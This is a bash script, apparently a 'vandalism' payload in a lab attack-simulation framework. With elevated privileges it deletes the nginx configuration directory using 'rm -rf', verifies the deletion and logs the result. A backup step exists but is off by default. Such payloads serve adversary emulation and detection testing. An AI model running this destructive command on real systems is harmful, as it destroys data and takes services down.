#!/usr/bin/env bash
#
# payloads/vandalism/nginx_delete/commands.sh
#
# Simulates service vandalism by deleting the nginx configuration/service
# directory from the target VM.
#
# Intended only for local lab/VM environments under your control.

set -euo pipefail

if [[ -z "${FRAMEWORK_ROOT:-}" ]]; then
    echo "[x] FRAMEWORK_ROOT must be set" >&2
    exit 1
fi

source "$FRAMEWORK_ROOT/lib/log_utils.sh"
source "$FRAMEWORK_ROOT/lib/metadata_utils.sh"
source "$FRAMEWORK_ROOT/lib/privilege_utils.sh"
source "$FRAMEWORK_ROOT/lib/random_utils.sh"

require_privilege

TARGET_PATH="${TARGET_PATH:-/etc/nginx}"

REQUIRE_PATH_EXISTS="${REQUIRE_PATH_EXISTS:-true}"

CREATE_BACKUP_BEFORE_DELETE="${CREATE_BACKUP_BEFORE_DELETE:-false}"

BACKUP_DIR="${BACKUP_DIR:-/var/tmp/aegis_backups}"

DELETE_COMMAND="${DELETE_COMMAND:-rm -rf}"

if [[ "$REQUIRE_PATH_EXISTS" == "true" ]]; then

    if ! run_priv "test -e '$TARGET_PATH'"; then
        fail "Target path does not exist: $TARGET_PATH"
    fi

fi

record_metadata "target_path=$TARGET_PATH"

if [[ "$CREATE_BACKUP_BEFORE_DELETE" == "true" ]]; then

    log "Creating backup before deletion"

    BACKUP_SUFFIX="$(random_lower_string 6)"

    BACKUP_NAME="nginx_backup_${BACKUP_SUFFIX}.tar.gz"

    BACKUP_PATH="${BACKUP_DIR}/${BACKUP_NAME}"

    run_priv "mkdir -p '$BACKUP_DIR'"

    run_priv "tar -czf '$BACKUP_PATH' '$TARGET_PATH'"

    record_metadata "backup_path=$BACKUP_PATH"

    log "Backup created: $BACKUP_PATH"

fi

log "Deleting target path"
log "Target: $TARGET_PATH"

run_priv "$DELETE_COMMAND '$TARGET_PATH'"

if run_priv "test -e '$TARGET_PATH'"; then
    fail "Deletion appears to have failed: $TARGET_PATH still exists"
fi

record_metadata "deletion_success=true"

log "Vandalism payload complete"
log "Deleted: $TARGET_PATH"
